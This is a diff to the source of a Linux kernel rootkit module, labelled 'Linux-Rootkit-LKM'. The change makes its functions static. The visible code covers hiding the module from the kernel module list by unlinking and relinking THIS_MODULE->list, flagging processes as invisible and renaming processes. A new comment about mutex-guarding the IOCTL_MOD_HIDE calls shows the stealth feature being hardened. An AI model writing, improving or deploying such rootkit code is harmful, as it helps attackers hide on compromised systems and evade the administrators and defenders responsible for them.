@@ -42,7 +42,7 @@ MODULE_DESCRIPTION("Linux-Rootkit-LKM");
 MODULE_LICENSE("Dual MIT/GPL");
 MODULE_VERSION("1.0");
 
-struct task_struct * find_task(pid_t pid)
+static struct task_struct * find_task(pid_t pid)
 {
 	struct task_struct *p;
 	// for_each_process requires rcu_read_lock() to safely walk the task list.
@@ -58,7 +58,7 @@ struct task_struct * find_task(pid_t pid)
 	return NULL;
 }
 
-int is_invisible(pid_t pid)
+static int is_invisible(pid_t pid)
 {
 	struct task_struct *task;
 	if (!pid)
@@ -71,7 +71,7 @@ int is_invisible(pid_t pid)
 	return 0;
 }
 
-int change_process_name(const char *orig_name, const char *new_name) {
+static int change_process_name(const char *orig_name, const char *new_name) {
     struct task_struct *p = NULL;
     int found = 0;
 
@@ -233,14 +233,14 @@ static short hidden = 0;
 // concurrent IOCTL_MOD_HIDE calls can both observe the same stale `hidden` value
 // and both call list_del()/list_add() on THIS_MODULE->list, corrupting it.
 static DEFINE_MUTEX(module_hide_lock);
-void module_show(void)
+static void module_show(void)
 {
     /* back to the module list where we remove before */
     list_add(&THIS_MODULE->list, prev_module);
     hidden = 0;
 	printk(KERN_INFO "module unhidden\n");
 }
-void module_hide(void)
+static void module_hide(void)
 {
     /* Save this module in the list before us, make this module back to the list in the same place later. */
     prev_module = THIS_MODULE->list.prev;
